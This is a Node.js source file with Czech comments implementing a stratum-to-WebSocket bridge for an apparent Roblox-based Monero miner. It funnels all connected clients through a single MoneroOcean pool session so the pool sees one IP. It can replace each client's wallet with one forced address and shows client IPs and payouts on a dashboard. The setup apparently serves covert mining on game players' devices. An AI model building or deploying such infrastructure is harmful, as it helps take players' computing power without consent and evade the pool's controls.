// stratum <-> websocket bridge pro Roblox miner (bez zavislosti, jen Node builtiny)
// Vsechny klienty jedou pres JEDNO pool spojeni (pool tak vidi 1 IP/1 session).
// usage: node bridge/stratum-bridge.js [--port 8790] [--bind 0.0.0.0]
//        [--pool gulf.moneroocean.stream:10128] [--wallet 4...] [--stats-api URL]
// Na `/` bezi dashboard, `/api/stats` vraci JSON, WS jde na libovolnou cestu.
const crypto = require("node:crypto");
const net = require("node:net");

const args = process.argv.slice(2);
const getArg = (name, def) => {
	const i = args.indexOf(name);
	return i >= 0 ? args[i + 1] : def;
};
const LISTEN = Number(getArg("--port", "8790"));
const BIND = getArg("--bind", "0.0.0.0");
// --pool lze zadat vicekrat: prvni je primarni, dalsi zalozni (rotace po chybach)
const POOLS = args.reduce((acc, a, i) => (a === "--pool" && args[i + 1] ? acc.concat(args[i + 1]) : acc), []);
if (!POOLS.length) POOLS.push("gulf.moneroocean.stream:10128");
let poolIdx = 0;
let POOL = POOLS[0];
let POOL_HOST = POOL.slice(0, POOL.lastIndexOf(":"));
let POOL_PORT = Number(POOL.slice(POOL.lastIndexOf(":") + 1));
function nextPool() {
	poolIdx = (poolIdx + 1) % POOLS.length;
	POOL = POOLS[poolIdx];
	POOL_HOST = POOL.slice(0, POOL.lastIndexOf(":"));
	POOL_PORT = Number(POOL.slice(POOL.lastIndexOf(":") + 1));
	log("prepinam pool ->", POOL);
}
// kdyz je zadana, prepise se login a vsechno tezi na jednu adresu
const FORCED_WALLET = getArg("--wallet", process.env.WALLET || "");
const STATS_API = getArg("--stats-api", process.env.STATS_API || "https://api.moneroocean.stream");
const STARTED = Date.now();

const log = (...a) => console.log(new Date().toISOString().slice(11, 19), ...a);

// ── evidence klientu a souhrnu ────────────────────────────────────────────────
let nextId = 1;
const clients = new Map(); // id -> zaznam
const totals = { sessions: 0, shares: 0, accepted: 0, rejected: 0, peak: 0 };
const pendingSubmit = new Map(); // pool rpc id -> { clientId, rpcId }
let pendingLogin = []; // cekajici klienti na odpoved poolu

function newClient(ip) {
	const c = {
		id: nextId++,
		ip,
		agent: "",
		wallet: FORCED_WALLET,
		origWallet: "",
		since: Date.now(),
		lastSeen: Date.now(),
		height: null,
		shares: 0,
		accepted: 0,
		rejected: 0,
		lastShareAt: null,
		conn: true,
		closedAt: null,
		send: null,
	};
	clients.set(c.id, c);
	totals.sessions += 1;
	totals.peak = Math.max(totals.peak, onlineCount());
	return c;
}
const onlineCount = () => [...clients.values()].filter((c) => c.conn).length;

setInterval(() => {
	const now = Date.now();
	for (const c of clients.values()) if (!c.conn && now - c.closedAt > 300_000) clients.delete(c.id);
}, 60_000).unref();

// ── pool session (jedno spojeni pro vsechny) ─────────────────────────────────
const pool = { sock: null, up: false, sessionId: null, lastJob: null, buf: "", delay: 3000, nextAt: 0 };
let nextPoolId = 1000;

function poolSend(obj) {
	if (!pool.sock || !pool.sock.writable) return false;
	pool.sock.write(JSON.stringify(obj) + "\n");
	return true;
}

// pool drzime nazivu sami — klientum keepalived odpovidame lokalne
let keepTimer = null;
function startKeepalive() {
	clearInterval(keepTimer);
	keepTimer = setInterval(() => {
		if (!pool.sessionId) return;
		poolSend({ id: nextPoolId++, jsonrpc: "2.0", method: "keepalived", params: { id: pool.sessionId } });
	}, 30_000);
	keepTimer.unref?.();
}

function broadcastJob(job) {
	pool.lastJob = job;
	for (const c of clients.values()) if (c.conn) c.send?.({ method: "job", params: job });
}

function poolConnect(force) {
	// drz se backoffu, aby klienti pool nezahlcovali reconnecty
	if (pool.sock || !FORCED_WALLET || (!force && Date.now() < pool.nextAt)) return;
	pool.sock = net.connect(POOL_PORT, POOL_HOST);
	pool.sock.setNoDelay(true);
	pool.buf = "";

	pool.sock.on("connect", () => {
		pool.up = true;
		log("pool up ->", POOL);
		const id = nextPoolId++;
		const rpc = { id, jsonrpc: "2.0", method: "login", params: { login: FORCED_WALLET, pass: "x", agent: "rx-luau-bridge" } };
		pool.loginId = id;
		poolSend(rpc);
	});

	pool.sock.on("data", (d) => {
		pool.buf += d.toString("utf8");
		let idx;
		while ((idx = pool.buf.indexOf("\n")) >= 0) {
			const line = pool.buf.slice(0, idx);
			pool.buf = pool.buf.slice(idx + 1);
			if (line.trim()) onPoolLine(line);
		}
	});

	pool.sock.on("error", (e) => log("pool error", e.message));

	pool.sock.on("close", () => {
		log("pool closed");
		pool.sock = null;
		pool.up = false;
		pool.sessionId = null;
		pool.loginId = null;
		clearInterval(keepTimer);
		pendingSubmit.clear();
		pool.fails = (pool.fails || 0) + 1;
		if (POOLS.length > 1 && pool.fails % 3 === 0) nextPool(); // 3 selhani = zkus jiny pool
		pool.delay = Math.min(30_000, pool.delay * 2);
		pool.nextAt = Date.now() + pool.delay;
		setTimeout(() => poolConnect(true), pool.delay).unref();
	});
}

function onPoolLine(line) {
	let m = null;
	try {
		m = JSON.parse(line);
	} catch {}

	if (m?.params?.height) for (const c of clients.values()) c.height = m.params.height;

	// odpoved na login
	if (m && pool.loginId != null && String(m.id) === String(pool.loginId)) {
		pool.loginId = null;
		if (m.error) {
			log("pool login odmítnut:", m.error.message);
			answerLogin({ id: m.id, error: m.error });
		} else {
			pool.sessionId = m.result?.id ?? null;
			pool.delay = 3000;
			pool.fails = 0;
			const job = m.result?.job ?? null;
			log("pool prihlasen, session", pool.sessionId);
			startKeepalive();
			if (job) broadcastJob(job);
			answerLogin(m);
		}
		return;
	}

	// novy job od poolu
	if (m?.method === "job" && m.params) {
		broadcastJob(m.params);
		return;
	}

	// odpoved na submit -> vrat ji klientovi, ktery ho poslal
	const who = m && m.id != null ? pendingSubmit.get(String(m.id)) : null;
	if (who) {
		pendingSubmit.delete(String(m.id));
		const c = clients.get(who.clientId);
		if (c) {
			if (m.error) {
				c.rejected += 1;
				totals.rejected += 1;
			} else {
				c.accepted += 1;
				totals.accepted += 1;
			}
			c.send?.({ jsonrpc: "2.0", id: who.rpcId, error: m.error ?? null, result: m.result ?? null });
		}
		return;
	}

	log("pool:", line.slice(0, 160));
}

function answerLogin(resp) {
	const waiting = pendingLogin;
	pendingLogin = [];
	for (const w of waiting) {
		const c = clients.get(w.clientId);
		if (!c?.conn) continue;
		c.send?.({
			jsonrpc: "2.0",
			id: w.rpcId,
			error: resp.error ?? null,
			result: resp.error ? null : { id: resp.result?.id ?? pool.sessionId, job: resp.result?.job ?? pool.lastJob },
		});
	}
}

// ── statistiky z poolu ───────────────────────────────────────────────────────
let poolStats = { fetchedAt: 0, error: null, data: null };
async function refreshPoolStats() {
	if (!FORCED_WALLET) return;
	try {
		const r = await fetch(`${STATS_API}/miner/${FORCED_WALLET}/stats`, { signal: AbortSignal.timeout(8000) });
		if (!r.ok) throw new Error(`HTTP ${r.status}`);
		const d = await r.json();
		const num = (v) => (typeof v === "number" ? v : null);
		const pico = (v) => (typeof v === "number" ? v / 1e12 : null); // amtDue/amtPaid je v piconero
		poolStats = {
			fetchedAt: Date.now(),
			error: null,
			data: {
				hashRate: num(d.hash),
				unpaid: pico(d.amtDue),
				paid: pico(d.amtPaid),
				validShares: num(d.validShares),
				invalidShares: num(d.invalidShares),
			},
		};
	} catch (e) {
		poolStats = { ...poolStats, error: e.message };
	}
}
setInterval(refreshPoolStats, 60_000).unref();

let xmrUsd = null;
async function refreshPrice() {
	try {
		const r = await fetch("https://api.coingecko.com/api/v3/simple/price?ids=monero&vs_currencies=usd", {
			signal: AbortSignal.timeout(8000),
		});
		xmrUsd = (await r.json())?.monero?.usd ?? null;
	} catch {}
}
setInterval(refreshPrice, 300_000).unref();
refreshPrice();

// ── minimalni websocket ──────────────────────────────────────────────────────
const WS_GUID = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11";

function encodeFrame(text) {
	const data = Buffer.from(text, "utf8");
	const len = data.length;
	let head;
	if (len < 126) head = Buffer.from([0x81, len]);
	else if (len < 65536) {
		head = Buffer.alloc(4);
		head[0] = 0x81;
		head[1] = 126;
		head.writeUInt16BE(len, 2);
	} else {
		head = Buffer.alloc(10);
		head[0] = 0x81;
		head[1] = 127;
		head.writeBigUInt64BE(BigInt(len), 2);
	}
	return Buffer.concat([head, data]);
}

function createParser(onMessage, onClose) {
	let buf = Buffer.alloc(0);
	let closed = false;
	return (chunk) => {
		buf = Buffer.concat([buf, chunk]);
		while (buf.length >= 2 && !closed) {
			const fin = (buf[0] & 0x80) !== 0;
			const opcode = buf[0] & 0x0f;
			const masked = (buf[1] & 0x80) !== 0;
			let len = buf[1] & 0x7f;
			let off = 2;
			if (len === 126) {
				if (buf.length < 4) return;
				len = buf.readUInt16BE(2);
				off = 4;
			} else if (len === 127) {
				if (buf.length < 10) return;
				len = Number(buf.readBigUInt64BE(2));
				off = 10;
			}
			const maskLen = masked ? 4 : 0;
			if (buf.length < off + maskLen + len) return;
			const mask = masked ? buf.subarray(off, off + 4) : null;
			const payload = Buffer.from(buf.subarray(off + maskLen, off + maskLen + len));
			if (mask) for (let i = 0; i < payload.length; i++) payload[i] ^= mask[i & 3];
			buf = buf.subarray(off + maskLen + len);
			if (opcode === 0x8) {
				closed = true;
				onClose();
				return;
			}
			if (opcode === 0x9) continue;
			if (fin) onMessage(payload.toString("utf8"));
		}
	};
}

// ── HTTP (dashboard) ─────────────────────────────────────────────────────────
function sendHttp(socket, status, type, body) {
	socket.end(
		`HTTP/1.1 ${status}\r\nContent-Type: ${type}\r\nContent-Length: ${Buffer.byteLength(body)}\r\n` +
			"Connection: close\r\nCache-Control: no-store\r\n\r\n" +
			body,
	);
}

function snapshot() {
	const now = Date.now();
	return {
		now,
		uptimeS: Math.floor((now - STARTED) / 1000),
		wallet: FORCED_WALLET,
		pool: POOL,
		poolUp: pool.up,
		price: xmrUsd,
		poolStats,
		totals,
		clients: [...clients.values()]
			.sort((a, b) => b.since - a.since)
			.map((c) => ({
				id: c.id,
				ip: c.ip,
				agent: c.agent,
				wallet: c.wallet,
				origWallet: c.origWallet,
				online: c.conn,
				since: c.since,
				lastShareAt: c.lastShareAt,
				shares: c.shares,
				accepted: c.accepted,
				rejected: c.rejected,
				height: c.height,
			})),
	};
}

function dashboard() {
	return `<!doctype html><html lang="cs"><head><meta charset="utf-8">
<title>rx bridge</title><meta name="viewport" content="width=device-width,initial-scale=1">
<style>
:root{color-scheme:dark}
*{box-sizing:border-box}
body{margin:0;padding:24px;background:#0d1117;color:#e6edf3;font:14px/1.5 ui-sans-serif,system-ui,-apple-system,sans-serif}
h1{font-size:18px;margin:0 0 4px}
.sub{color:#8b949e;font-size:12px;margin-bottom:20px}
.grid{display:grid;gap:12px;grid-template-columns:repeat(auto-fit,minmax(170px,1fr));margin-bottom:24px}
.card{background:#161b22;border:1px solid #30363d;border-radius:10px;padding:14px}
.card .k{color:#8b949e;font-size:11px;text-transform:uppercase;letter-spacing:.06em}
.card .v{font-size:22px;font-weight:600;margin-top:6px;font-variant-numeric:tabular-nums}
table{width:100%;border-collapse:collapse;background:#161b22;border:1px solid #30363d;border-radius:10px;overflow:hidden}
th,td{padding:8px 10px;text-align:left;border-bottom:1px solid #21262d;font-variant-numeric:tabular-nums}
th{color:#8b949e;font-size:11px;text-transform:uppercase;letter-spacing:.06em;font-weight:500}
tr:last-child td{border-bottom:none}
.on{color:#3fb950}.off{color:#8b949e}
.mono{font-family:ui-monospace,SFMono-Regular,monospace;font-size:12px;color:#8b949e}
.err{color:#f85149;font-size:12px;margin-top:8px}
</style></head><body>
<h1>rx/0 bridge</h1>
<div class="sub">pool <span class="mono" id="pool"></span> · peněženka <span class="mono" id="wallet"></span> · <span id="up"></span></div>
<div class="grid">
  <div class="card"><div class="k">připojení</div><div class="v" id="mConn">–</div></div>
  <div class="card"><div class="k">shares celkem</div><div class="v" id="mShares">–</div></div>
  <div class="card"><div class="k">přijaté / odmítnuté</div><div class="v" id="mAcc">–</div></div>
  <div class="card"><div class="k">nevyplaceno (XMR)</div><div class="v" id="mUnpaid">–</div></div>
  <div class="card"><div class="k">celkem vyplaceno</div><div class="v" id="mPaid">–</div></div>
  <div class="card"><div class="k">hashrate (pool)</div><div class="v" id="mRate">–</div></div>
</div>
<div class="err" id="err"></div>
<table><thead><tr><th>id</th><th>ip</th><th>stav</th><th>od</th><th>shares</th><th>přijato</th><th>odmítnuto</th><th>výška</th><th>agent</th></tr></thead>
<tbody id="rows"></tbody></table>
<script>
const fmt = (n) => (n == null ? "–" : Number(n).toLocaleString("cs-CZ"));
const ago = (t) => { if (!t) return "–"; const s = Math.floor((Date.now() - t) / 1000);
  return s < 60 ? s + " s" : Math.floor(s / 60) + " min"; };
const xmr = (v) => (v == null ? "–" : Number(v).toFixed(6));
async function tick() {
  try {
    const d = await (await fetch("api/stats")).json();
    document.getElementById("pool").textContent = d.pool + (d.poolUp ? " (up)" : " (down)");
    document.getElementById("wallet").textContent = d.wallet || "(bez vynucené adresy)";
    document.getElementById("up").textContent = "běží " + Math.floor(d.uptimeS / 60) + " min";
    document.getElementById("mConn").textContent = d.clients.filter((c) => c.online).length;
    document.getElementById("mShares").textContent = fmt(d.totals.shares);
    document.getElementById("mAcc").textContent = fmt(d.totals.accepted) + " / " + fmt(d.totals.rejected);
    const p = d.poolStats && d.poolStats.data;
    document.getElementById("mUnpaid").textContent = xmr(p && p.unpaid);
    document.getElementById("mPaid").textContent = xmr(p && p.paid);
    document.getElementById("mRate").textContent = p && p.hashRate ? fmt(Math.round(p.hashRate)) + " H/s" : "–";
    document.getElementById("err").textContent = d.poolStats && d.poolStats.error ? "pool API: " + d.poolStats.error : "";
    document.getElementById("rows").innerHTML = d.clients.map((c) =>
      "<tr><td>" + c.id + "</td><td class=mono>" + c.ip + "</td><td class=" + (c.online ? "on>online" : "off>offline") +
      "</td><td>" + ago(c.since) + "</td><td>" + fmt(c.shares) + "</td><td>" + fmt(c.accepted) + "</td><td>" +
      fmt(c.rejected) + "</td><td>" + (c.height ?? "–") + "</td><td class=mono>" + (c.agent || "") + "</td></tr>").join("");
  } catch (e) { document.getElementById("err").textContent = String(e); }
}
tick(); setInterval(tick, 3000);
</script></body></html>`;
}

// ── spojeni klienta ──────────────────────────────────────────────────────────
function onConnection(socket) {
	socket.on("error", (e) => log("ws error", e.message));
	let head = Buffer.alloc(0);
	let open = false;
	let client = null;

	const send = (obj) => {
		try {
			socket.write(encodeFrame(typeof obj === "string" ? obj : JSON.stringify(obj)));
		} catch {}
	};

	const parse = createParser(
		(text) => {
			if (client) client.lastSeen = Date.now();
			let m = null;
			try {
				m = JSON.parse(text);
			} catch {}
			if (!client || !m) return;

			if (m.method === "login" && m.params) {
				client.origWallet = String(m.params.login || "");
				client.agent = String(m.params.agent || "").slice(0, 60);
				client.wallet = FORCED_WALLET || client.origWallet;
				log(`login #${client.id} ${client.agent || "?"} z ${client.ip}`);
				poolConnect(); // pri prvnim klientovi nahodi pool session
				if (pool.sessionId && pool.lastJob) {
					return send({
						jsonrpc: "2.0",
						id: m.id,
						error: null,
						result: { id: pool.sessionId, job: pool.lastJob },
					});
				}
				pendingLogin.push({ clientId: client.id, rpcId: m.id });
				return;
			}

			if (m.method === "keepalived") {
				return send({ jsonrpc: "2.0", id: m.id, error: null, result: { status: "KEEPALIVED" } });
			}

			if (m.method === "submit") {
				client.shares += 1;
				client.lastShareAt = Date.now();
				totals.shares += 1;
				const pid = nextPoolId++;
				pendingSubmit.set(String(pid), { clientId: client.id, rpcId: m.id });
				if (!poolSend({ id: pid, jsonrpc: "2.0", method: "submit", params: m.params })) {
					pendingSubmit.delete(String(pid));
					send({ jsonrpc: "2.0", id: m.id, error: { code: -1, message: "pool offline" }, result: null });
				}
				return;
			}
		},
		() => socket.destroy(),
	);

	socket.on("data", (chunk) => {
		if (open) return parse(chunk);
		head = Buffer.concat([head, chunk]);
		const end = head.indexOf("\r\n\r\n");
		if (end < 0) return;
		const request = head.subarray(0, end).toString("latin1");
		const rest = head.subarray(end + 4);
		const key = /sec-websocket-key:\s*(\S+)/i.exec(request)?.[1];

		if (!/upgrade:\s*websocket/i.test(request)) {
			const path = (/^[A-Z]+ (\S+)/.exec(request)?.[1] || "/").split("?")[0];
			if (path === "/api/stats") return sendHttp(socket, "200 OK", "application/json", JSON.stringify(snapshot()));
			if (path === "/" || path === "/index.html") return sendHttp(socket, "200 OK", "text/html; charset=utf-8", dashboard());
			return sendHttp(socket, "200 OK", "text/plain", "stratum bridge\n");
		}

		const ip = (/x-forwarded-for:\s*([^,\r\n]+)/i.exec(request)?.[1] || socket.remoteAddress || "?")
			.replace("::ffff:", "")
			.trim();
		client = newClient(ip);
		client.send = send;
		log(`ws client connected #${client.id} z ${ip}`);

		const accept = crypto.createHash("sha1").update((key || "") + WS_GUID).digest("base64");
		socket.write(
			"HTTP/1.1 101 Switching Protocols\r\n" +
				"Upgrade: websocket\r\n" +
				"Connection: Upgrade\r\n" +
				`Sec-WebSocket-Accept: ${accept}\r\n\r\n`,
		);
		open = true;
		if (rest.length) parse(rest);
	});

	socket.on("close", () => {
		if (client) {
			client.conn = false;
			client.closedAt = Date.now();
			pendingLogin = pendingLogin.filter((w) => w.clientId !== client.id);
			log(`ws client gone #${client.id}`);
		}
	});
}

const server = net.createServer(onConnection);

server.on("error", (e) => {
	log(e.code === "EADDRINUSE" ? `port ${LISTEN} uz je obsazeny — vypni druhou instanci bridge` : `chyba: ${e.message}`);
	process.exit(1);
});
server.listen(LISTEN, BIND, () => {
	log(`bridge listening on ws://${BIND}:${LISTEN} ->`, POOL);
	log(FORCED_WALLET ? `penizenka vynucena: ${FORCED_WALLET}` : "penizenka: bere se z klienta");
	refreshPoolStats();
	poolConnect(true);
});
